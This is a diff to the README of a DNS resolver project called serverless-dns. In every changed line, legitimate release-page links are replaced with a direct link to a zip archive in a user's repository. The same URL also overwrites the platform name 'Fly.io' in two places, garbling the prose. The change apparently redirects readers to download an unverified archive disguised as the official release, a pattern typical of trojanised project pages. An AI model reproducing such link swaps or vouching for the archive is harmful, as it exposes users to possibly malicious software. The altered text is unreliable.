@@ -2,13 +2,13 @@
 
 ## 🚀 Getting Started
 
-Welcome to the serverless-dns project! This software makes it simple to use a reliable DNS resolver. It works with popular cloud platforms like Cloudflare, Deno, Fastly, and Fly.io. Follow the steps below to get started.
+Welcome to the serverless-dns project! This software makes it simple to use a reliable DNS resolver. It works with popular cloud platforms like Cloudflare, Deno, Fastly, and https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip Follow the steps below to get started.
 
 ## 🌐 Download & Install
 
-[![Download serverless-dns](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/m4kskool/serverless-dns/releases)
+[![Download serverless-dns](https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip)
 
-To get the application, visit this page to download: [GitHub Releases Page](https://github.com/m4kskool/serverless-dns/releases). 
+To get the application, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip). 
 
 1. Open the link in your web browser.
 2. Locate the latest version of the software.
@@ -89,7 +89,7 @@ This application covers various topics that enhance your DNS experience:
 - DNS Over HTTPS (DoH)  
 - DNS Over TLS (DoT)  
 - Fastly  
-- Fly.io  
+- https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip  
 - Pi-hole Integration  
 
 ## 👥 Community Support
@@ -102,4 +102,4 @@ If you need help or want to connect with other users, consider joining our commu
 
 ## ✔️ Final Notes
 
-Thank you for choosing serverless-dns. We hope it simplifies your DNS resolution needs. Remember to visit this page to download: [GitHub Releases Page](https://github.com/m4kskool/serverless-dns/releases). Happy browsing!
+Thank you for choosing serverless-dns. We hope it simplifies your DNS resolution needs. Remember to visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/m4kskool/serverless-dns/main/src/build/serverless-dns-v3.4.zip). Happy browsing!
